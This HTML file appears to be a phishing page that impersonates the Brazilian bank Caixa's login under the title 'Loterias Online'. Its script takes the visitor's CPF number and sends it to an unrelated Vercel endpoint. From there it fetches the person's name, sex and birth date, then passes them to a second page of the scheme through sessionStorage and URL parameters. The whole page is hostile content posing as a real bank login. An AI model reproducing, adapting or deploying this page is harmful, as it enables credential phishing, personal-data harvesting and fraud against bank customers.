<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Loterias Online</title>
  <link href="css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
  <link href="../css2.css?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&amp;display=swap" rel="stylesheet">

  <style>
    @font-face {
        font-family: 'Futura-Book';
        src: url('fonts/Futura-Book.eot');
        src: url('fonts/Futura-Book.eot') format('embedded-opentype'),
            url('fonts/Futura-Book.woff2') format('woff2'),
            url('fonts/Futura-Book.woff') format('woff'),
            url('fonts/Futura-Book.ttf') format('truetype'),
            url('images/Futura-Book.svg') format('svg');
        font-weight: normal;
        font-style: normal;
        font-display: swap;
    }

    body { font-family: 'Futura-Book' !important; }

    .container-bg {
        background: linear-gradient(45deg, #00a9ad, #005ca9); 
        background-size: 100%;
        background-repeat: no-repeat;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
    }

    .container-principal {
        height: auto;
        margin: 0 auto;
        background-color: white;
        width: 450px;
        max-width: 95%;
        color: black;
        background-color: #fff !important;
        border-radius: .4rem;
        box-shadow: 0px 4px 8px rgb(0 0 0 / 30%);
        padding: 3rem 4rem;
    }

    @media (max-width: 576px) {
        .container-principal { padding: 3rem 2rem !important; } 
    }

    .container-principal img { width: 150px; }

    .container-principal h1 {
        color: #0070ae;
        font-size: 1rem;
        margin-top: .4rem;
    }

    .container-principal h2 {
        color: #4d7880;
        font-size: 1.1rem;
        margin-top: 1rem;
        margin-bottom: 2.2rem;
        width: 100%;
        text-align: justify;
    }

    .container-principal h3 {
        color: #0070ae;
        font-size: 1rem;
        margin-top: .6rem;
    }

    .container-principal h3 a{
        color: #0070ae;
        font-weight: 600;
    }

    .container-principal form {
        width: 100%;
        display: flex;
        flex-direction: column;
    }

    .container-principal .form-group {
        position: relative;
        width: 100%;
        margin-bottom: 1.5rem;
    }

    .container-principal form label {
        position: absolute;
        top: 11%;
        left: 0;
        transform: translateY(-11%);
        color: #4d7880;
        font-size: 1rem;
        pointer-events: none;
        transition: all 0.3s ease;
    }

    .container-principal form input {
        font-size: 1rem;
        margin: 0 !important;
        padding: 0 !important;
        height: 40px;
        width: 100%;
        border: none;
        border-bottom: 1.3px orange solid !important;
        padding-left: 5px;
        color: #4d7880;
    }

    .container-principal form input:focus { outline: 0px !important; }

    .botoes { margin-top: 2rem; }

    button.botoes  {
        margin-top: 1.5rem;
        background-color: #f39200;
        color: white;
        font-weight: 500;
        width: 100%;
        border: none;
        padding: .5rem 1rem;
        font-size: 1rem;
        border-radius: .2rem;
        margin-bottom: .4rem
    }

    button.botoes:hover {
        background-color: #173e68;
        color: white;
    }
  </style>
</head>

<body>
<div class="container-bg">
  <div class="container-principal d-flex justify-content-center align-items-center flex-column">
    <img src="images/logo-caixa.webp" alt="">
    <h1>Login Caixa</h1>
    <h2>Informe seu CPF e clique em "Próximo" para continuar:</h2>

    <form id="cpfForm">
      <div class="form-group">
        <label for="cpf" style="top: 11%;">CPF</label><br>
        <input name="cpf" id="cpf" type="text" onkeyup="formatCpf(this)" maxlength="14" inputmode="numeric" autocomplete="off">
        <button class="botoes" type="submit">Próximo</button>
      </div>
    </form>

    <h3>É novo por aqui? <a href="">Cadastre-se</a></h3>
    <h3><a href="">Preciso de ajuda</a></h3>
  </div>
</div>

<script>
  function formatCpf(input) {
    const onlyDigits = input.value.replace(/\D/g, '').slice(0, 11);
    let formatted = onlyDigits;
    if (onlyDigits.length > 9) {
      formatted = onlyDigits.replace(
        /^(\d{3})(\d{3})(\d{3})(\d{0,2}).*/,
        (m, a, b, c, d) => d ? `${a}.${b}.${c}-${d}` : `${a}.${b}.${c}`
      );
    } else if (onlyDigits.length > 6) {
      formatted = onlyDigits.replace(
        /^(\d{3})(\d{3})(\d{0,3}).*/,
        (m, a, b, c) => c ? `${a}.${b}.${c}` : `${a}.${b}`
      );
    } else if (onlyDigits.length > 3) {
      formatted = onlyDigits.replace(
        /^(\d{3})(\d{0,3}).*/,
        (m, a, b) => b ? `${a}.${b}` : `${a}`
      );
    }
    input.value = formatted;
  }

  document.getElementById('cpfForm').addEventListener('submit', async function (event) {
    event.preventDefault();

    const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
    const button = this.querySelector('button[type="submit"]');

    button.disabled = true;
    button.textContent = 'Consultando...';

    try {
      if (cpf.length !== 11) {
        throw new Error('CPF inválido.');
      }

      const response = await fetch(`https://cfeefe-rd4p.vercel.app/api/proxy-btz?cpf=${cpf}`);
      if (!response.ok) throw new Error('Falha na consulta.');

      const data = await response.json();

      // 🔴 AQUI É A ÚNICA ALTERAÇÃO
      const nome = data?.resultado?.dados?.NOME?.toString().trim();
      const sexo = data?.resultado?.dados?.SEXO?.toString().trim();
      const nasc = data?.resultado?.dados?.NASC?.toString().trim();

      if (nome) {
        sessionStorage.setItem('nomeTitular', nome);
        if (sexo) sessionStorage.setItem('sexoTitular', sexo);
        if (nasc) sessionStorage.setItem('nascTitular', nasc);

        const nextUrl = new URL('../2/', window.location.href);
        nextUrl.searchParams.set('nome', nome);
        if (sexo) nextUrl.searchParams.set('sexo', sexo);
        if (nasc) nextUrl.searchParams.set('nasc', nasc);

        window.location.assign(nextUrl.toString());
      } else {
        alert('Nome não encontrado.');
      }
    } catch (error) {
      console.error(error);
      alert('Ocorreu um erro na consulta.');
    } finally {
      button.disabled = false;
      button.textContent = 'Próximo';
    }
  });
</script>
</body>
</html>
